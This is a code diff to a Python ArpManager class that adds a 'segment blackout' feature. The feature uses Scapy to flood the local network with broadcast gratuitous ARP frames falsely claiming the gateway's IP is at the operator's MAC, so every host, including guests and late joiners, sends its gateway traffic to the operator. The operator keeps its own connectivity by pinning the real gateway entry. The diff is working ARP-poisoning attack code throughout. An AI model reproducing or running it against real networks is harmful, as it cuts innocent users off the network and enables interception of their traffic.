@@ -51,6 +51,9 @@ class ArpManager:
         # in which case the L1 kernel drop is skipped (ARP poisoning still runs).
         self.nft = None
         self._safe_mode = False
+        # Segment blackout state (broadcast gateway poison; separate from cuts).
+        self._blackout: dict = {}
+        self._blackout_stop: threading.Event | None = None
 
     def set_safe_mode(self, enabled: bool):
         self._safe_mode = enabled
@@ -155,6 +158,104 @@ class ArpManager:
             stops = list(self._flood_stops.values())
         for evt in stops:
             evt.set()
+
+    # ── Segment blackout (broadcast gateway poison) ───────────────────────────
+
+    def blackout_start(self, gateway: str, iface: str, my_ip: str) -> bool:
+        """Broadcast-poison the WHOLE segment's ARP for the gateway.
+
+        Floods a gratuitous ARP to ff:ff:ff:ff:ff:ff claiming the gateway's IP is
+        at OUR MAC, so every host on the segment — including ones not in any scan
+        table (guests, rogue boxes, late joiners) — routes its gateway traffic to
+        us. Unlike cut()/_build_l2_frames (which is deliberately unicast and
+        target-scoped), this IS segment-wide on purpose. The caller pairs it with
+        an nft FORWARD drop to blackhole the redirected traffic.
+
+        The operator stays online: we pin OUR OWN neighbor entry for the gateway
+        to the real gateway MAC (nud permanent), and we never poison our own IP,
+        so the gateway still reaches us. Returns False if the MACs can't resolve.
+        """
+        if not valid_ip(gateway) or not SCAPY_OK:
+            return False
+        _t, gw_mac, my_mac = self._resolve_macs(gateway, gateway, iface)
+        if not my_mac or not gw_mac:
+            return False
+
+        # Pin our own gateway neighbor so the blackout never takes us offline.
+        if not _IS_WINDOWS:
+            subprocess.run(
+                [
+                    "ip",
+                    "neigh",
+                    "replace",
+                    gateway,
+                    "lladdr",
+                    gw_mac,
+                    "dev",
+                    iface,
+                    "nud",
+                    "permanent",
+                ],
+                capture_output=True,
+            )
+
+        stop_evt = threading.Event()
+        with self._lock:
+            self._blackout = {"gateway": gateway, "iface": iface, "gw_mac": gw_mac}
+            self._blackout_stop = stop_evt
+
+        def _flood():
+            frames = [
+                Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff")
+                / ARP(op=2, hwsrc=my_mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway),
+                Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff")
+                / ARP(op=1, hwsrc=my_mac, psrc=gateway, hwdst="00:00:00:00:00:00", pdst=gateway),
+            ]
+            raw = RawL2Sender(iface)
+            raw_bytes = [bytes(f) for f in frames] if raw.available else []
+            try:
+                while not stop_evt.is_set():
+                    try:
+                        if raw.available:
+                            for i, fb in enumerate(raw_bytes):
+                                if not raw.send(fb):
+                                    sendp(frames[i], iface=iface, verbose=False)
+                        else:
+                            for pkt in frames:
+                                sendp(pkt, iface=iface, verbose=False)
+                    except Exception:
+                        pass
+                    stop_evt.wait(self.ARP_INTERVAL)
+            finally:
+                raw.close()
+
+        threading.Thread(target=_flood, daemon=True, name="arp_blackout").start()
+        return True
+
+    def blackout_stop(self):
+        """Stop the broadcast poison, heal the segment with the real gateway MAC,
+        and release our pinned gateway neighbor. Idempotent."""
+        if self._blackout_stop:
+            self._blackout_stop.set()
+        with self._lock:
+            info = self._blackout
+            self._blackout = {}
+            self._blackout_stop = None
+        if not info:
+            return
+        gateway, iface, gw_mac = info["gateway"], info["iface"], info["gw_mac"]
+        # Heal: broadcast the REAL gateway MAC so poisoned caches recover.
+        if SCAPY_OK and gw_mac:
+            try:
+                heal = Ether(src=gw_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
+                    op=2, hwsrc=gw_mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway
+                )
+                sendp(heal, iface=iface, count=20, inter=0.05, verbose=False)
+            except Exception:
+                pass
+        # Release our pinned neighbor (back to dynamic).
+        if not _IS_WINDOWS:
+            subprocess.run(["ip", "neigh", "del", gateway, "dev", iface], capture_output=True)
 
     # ── MAC resolution ──────────────────────────────────────────────────────
 
